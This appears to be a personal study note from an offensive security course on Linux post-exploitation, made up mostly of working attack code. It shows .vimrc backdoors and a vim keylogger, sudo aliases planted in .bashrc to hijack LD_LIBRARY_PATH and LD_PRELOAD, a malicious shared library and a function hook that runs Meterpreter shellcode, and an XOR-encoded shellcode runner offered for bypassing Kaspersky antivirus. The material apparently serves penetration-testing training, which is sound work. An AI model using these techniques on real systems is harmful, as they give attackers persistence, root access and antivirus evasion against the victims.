## Linux post exploitation
Linking Linux:
[[Linux LM]]
Meterpreter:
[[General Meterpreter Post-exp]]

### User configuration files

**.bash_profile** is executed when logging session is started.
**.bashrc** is executed when the new terminal is opened in the existing session.

We can use this to maintain persistance or escalate privilages.

VIM config simple backdoor - **.vimrc** in user's home directory. With the ! we can run shell commands e.g.
#vim #bash #backdoor #config
```bash
:silent !touch /tmp/text.txt
```

To be stealthy with our commands we can source the shell script with:
#vim #bash #backdoor #config
```bash
:silent !source /home/user/.hidden_file
```

We can also source other VIM config with source command without the !:
#vim #bash #backdoor #config
```bash
:silent source /home/user/.hidden_vimrc
```

If we want to do the same interactively in vim we must do the : first.

Or we can use the vim plugin directory, all vim configuration with extension **.vim** in the following dir will be run:
#vim #bash #backdoor
```bash
~/.vim/plugin/
```

We can escalate the privilages if user runs sudo with vim and it is **Ubuntu or Red Hat**, as they load the user's **.vimrc** in the root user context. The Debian uses the root's .vimrc context when sudo vim or  vimsudo.
For debian we must add the following line to .bashrc:
#bash #sudo #priv-esc-linux #config
```bash
echo 'alias sudo="sudo -E"' >> .bashrc
source ~/.bashrc
```

The -E option forces the sudo to use user's .vimrc
If we are able to vim as root without the password we can easly escalate:
#vim #bash #cmd-exec #sudo
```bash
:shell
```

### VIM config simple keylogger:
#vim #keylogger #config
```bash
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
```

for logging root only changes to the file:
#vim #root #keylogger #config
```bash
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```

## Bypass AV on Linux

There are certain usage of **kesl-control** that I do not note here, if every needed refer to the book. It is vendor specific Kaspersky. 

To bypass Kaspersky it is enough to compile the C shellcode runner with XOR encoding:
#av-bypass #c #linux #shellcode-runner

XOR encoder for the payload:
#xor #linux #av-bypass #encoding 

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Our payload generated by msfvenom
// msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=443 LHOST=host -f c
unsigned char buf[] =
"<meterpreter>";


int main (int argc, char **argv)
{
char xor_key = 'J';
int payload_length = (int) sizeof(buf);
for (int i=0; i<payload_length; i++)
{
printf("\\x%02X",buf[i]^xor_key);
}
return 0;
}
```


Then the shellcode runner with the XOR decoder:
#av-bypass #c #linux #shellcode-runner #xor #decoding
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Our obfuscated shellcode
unsigned char buf[] =
"\x20\x73\x12\x45\x4F\x02\xCF\x8A...x32\x71\x02\xDD\x02\xF3\x48";

int main (int argc, char **argv)
{
char xor_key = 'J';
int arraysize = (int) sizeof(buf);
for (int i=0; i<arraysize-1; i++)
{
buf[i] = buf[i]^xor_key;
}
int (*ret)() = (int(*)())buf;
ret();
}
```

## Shared Libraries

Similar to the DLL_hijacking. The search for the shared libs in Linux is as follows:
1. Directories listed in the application’s RPATH 
2. Directories specified in the LD_LIBRARY_PATH environment variable.
3. Directories listed in the application’s RUNPATH 
4. Directories specified in /etc/ld.so.conf
5. System library directories: /lib , /lib64 , /usr/lib , /usr/lib64 , /usr/local/lib , /usr/local/lib64 , and potentially others.

### LD_LIBRARY_PATH

Our target is LD_LIBRARY_PATH as we can set it as the user. We can insert this line in the user's **.bashrc** or **.bash_profile**.
#priv-esc-linux 
```bash
alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"
```

For both LD_LIBRARY_PATH and LD_PRELOAD, we require a victim with the password to exploit. The exploit process looks like this:
- we have compromised the victim user, who is the sudoer but needs the password
- we set the sudo alias to add the LD_LIBRARY_PATH to sudo for that user.
- The code would be executed as root, when the victim would execute the sudo command typing the password.

Simple malicoud shared library:
#priv-esc-linux #c #shared-lib
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid
static void runmahpayload() __attribute__((constructor));
void runmahpayload() {
setuid(0);
setgid(0);
printf("DLL HIJACKING IN PROGRESS \n");
system("touch /tmp/haxso.txt");
}

// To compile:
// gcc -Wall -fPIC -c -o hax.o hax.c
// -fPIC is position independent, -c compiles but not link
// To create the shared lib:
// gcc -shared -o libhax.so hax.o

```

Now we need to replace any other shared library used by the binary, to display shared libs of top:
#shared-lib 
```bash
ldd /usr/bin/top
```

We can replace the libgpg-error.so.0
```bash
# we rename the previously compiled libhax.so to the libgpg-error
cp libhax.so libgpg-error.so.0
export LD_LIBRARY_PATH=/home/offsec/ldlib/
```

However, that causes errors as we do not have symbols in our so. We can get the list of symbols from original lib:
#shared-lib 

```bash
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```

Then copy/paste the output just after the constructor declaration. However, there is a version map missing, to add that:
#shared-lib 
```bash
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```
The output must be wrapped and stored in the gpg.map:
#shared-lib 
```bash
GPG_ERROR_1.0 {
gpgrt_onclose;
_gpgrt_putc_overflow;
...
gpgrt_fflush;
gpgrt_poll;
};
```
Then when we compile:
#compile #c
```bash
gcc -Wall -fPIC -c -o hax.o hax.c
gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o
```

Final alias in .bashrc:
#priv-esc-linux #alias
```
alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"
```


### LD_PRELOAD

The variable is used for hooking the functions, to execute something before the programs starts, similar limitations as the previous one.

To get the function calls we can use ltrace:

```bash
ltrace cp
```

We have chosen the geteuid() function call to hook as this is only runs once in the cp.

Let's create the malicous hook:
#hook #c #priv-esc-linux 
```C
#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

char buf[] = "<meterpreter>";

uid_t geteuid(void)
{
    // create the pointer to old_geteuid to execute it at the end
    typeof(geteuid) *old_geteuid;
    old_geteuid = dlsym(RTLD_NEXT, "geteuid");


    if (fork() == 0)
    {
    intptr_t pagesize = sysconf(_SC_PAGESIZE);
    if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
    pagesize, PROT_READ|PROT_EXEC)) {
        perror("mprotect");
        return -1;
        }
    int (*ret)() = (int(*)())buf;
    ret();
    }
    else
    {
    printf("HACK: returning from function...\n");
    return (*old_geteuid)();
    }
    printf("HACK: Returning from main...\n");
    return -2
    }

// To comiple:
// gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c
// gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl

```


To trick the victim place the following alias in the .bashrc
#priv-esc-linux 
```bash
alias sudo="sudo LD_PRELOAD=/home/offsec/evil_geteuid.so"
```
